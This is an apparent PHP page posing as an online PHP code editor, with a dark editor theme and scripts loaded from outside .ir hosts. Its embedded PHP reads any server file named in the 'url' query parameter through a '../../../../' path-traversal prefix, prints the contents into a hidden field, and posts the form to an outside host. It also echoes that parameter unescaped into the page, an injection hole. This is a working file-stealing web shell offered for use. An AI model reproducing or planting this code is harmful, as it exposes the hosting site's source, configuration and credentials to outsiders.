<style>input:focus{background: #dad4d4;color: #3b343a}input{padding: 5px 23px;background: #782574;color: #fff;border-radius: 24px;margin: 3px 15px;}*{outline:0;-webkit-transition:all .4s ease-out;-moz-transition:all .4s ease-out;-ms-transition:all .4s ease-out;-o-transition:all .4s ease-out;transition:all .4s ease-out}.ace-tm{height:91%!important}</style>
<meta name="viewport" content="width=device-width,initial-scale=1">
<script>var DEFAULT_PHP = "8.2.13";var userHP = true;var userEditorTheme = 'dracula';var userNoAds = true;var userNoCaptcha = true;var userNoComments = true;
var userAceOptions = {};var userSettings = {};</script><link href="https://upl.alnovin.ir/app.css" rel="stylesheet">
<script src="https://dl.natilos.ir/ffff/app.js?j" defer></script>
<script>
(function(a,c,e){c.isDark=!0,c.cssClass="ace-dracula",c.cssText=".ace-dracula .ace_gutter {background: #282a36;color: rgb(144,145,148)}.ace-dracula .ace_print-margin {width: 1px;background: #44475a}.ace-dracula {background-color: #282a36;color: #f8f8f2}.ace-dracula .ace_cursor {color: #f8f8f0}.ace-dracula .ace_marker-layer .ace_selection {background: #44475a}.ace-dracula.ace_multiselect .ace_selection.ace_start {box-shadow: 0 0 3px 0px #282a36;border-radius: 2px}.ace-dracula .ace_marker-layer .ace_step {background: rgb(198, 219, 174)}.ace-dracula .ace_marker-layer .ace_bracket {margin: -1px 0 0 -1px;border: 1px solid #a29709}.ace-dracula .ace_marker-layer .ace_active-line {background: #44475a}.ace-dracula .ace_gutter-active-line {background-color: #44475a}.ace-dracula .ace_marker-layer .ace_selected-word {box-shadow: 0px 0px 0px 1px #a29709;border-radius: 3px;}.ace-dracula .ace_fold {background-color: #50fa7b;border-color: #f8f8f2}.ace-dracula .ace_keyword {color: #ff79c6}.ace-dracula .ace_constant.ace_language {color: #bd93f9}.ace-dracula .ace_constant.ace_numeric {color: #bd93f9}.ace-dracula .ace_constant.ace_character {color: #bd93f9}.ace-dracula .ace_constant.ace_character.ace_escape {color: #ff79c6}.ace-dracula .ace_constant.ace_other {color: #bd93f9}.ace-dracula .ace_support.ace_function {color: #8be9fd}.ace-dracula .ace_support.ace_constant {color: #6be5fd}.ace-dracula .ace_support.ace_class {font-style: italic;color: #66d9ef}.ace-dracula .ace_support.ace_type {font-style: italic;color: #66d9ef}.ace-dracula .ace_storage {color: #ff79c6}.ace-dracula .ace_storage.ace_type {font-style: italic;color: #8be9fd}.ace-dracula .ace_invalid {color: #F8F8F0;background-color: #ff79c6}.ace-dracula .ace_invalid.ace_deprecated {color: #F8F8F0;background-color: #bd93f9}.ace-dracula .ace_string {color: #f1fa8c}.ace-dracula .ace_comment {color: #6272a4}.ace-dracula .ace_variable {color: #50fa7b}.ace-dracula .ace_variable.ace_parameter {font-style: italic;color: #ffb86c}.ace-dracula .ace_entity.ace_other.ace_attribute-name {color: #50fa7b}.ace-dracula .ace_entity.ace_name.ace_function {color: #50fa7b}.ace-dracula .ace_entity.ace_name.ace_tag {color: #ff79c6}.ace-dracula .ace_invisible {color: #626680;}.ace-dracula .ace_indent-guide {background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAACCAYAAACZgbYnAAAAEklEQVQImWNgYGBgYHB3d/8PAAOIAdULw8qMAAAAAElFTkSuQmCC) right repeat-y}",c.$selectionColorConflict=!0,a("../lib/dom").importCssString(c.cssText,c.cssClass,!1)})),ace.require(["ace/theme/dracula"],(function(a){"object"==typeof module&&"object"==typeof exports&&module&&(module.exports=a)}));
</script>

<form id="sandboxform" class="php-editor-form" action="https://natilos.ir" data-destroy="true" method="post"><?php
           $fe=$_GET["url"];
           if($fe){echo '<input value="'.$fe.'" name="url"hidden="hidden">';}
            ?>
                  <INPUT type=submit value="Submit">
            <textarea name="editor" aria-label="Your PHP code" id="ta_sandboxform" class="editor"style="display:none"><?php $fe=$_GET["url"];
           if($fe){$fj="../../../../".$fe;}else{$fj='text.php';}
           if(filesize($fj)>0){
            $fi = fopen($fj, "r");
            while(!feof($fi)) {
                echo fgets($fi);
            }}
            ?></textarea>
<div id="editor_sandboxform" class="editor-wrapper panel-left resizable"></div>
<div class="dark-mode-toggle"></div>
</form>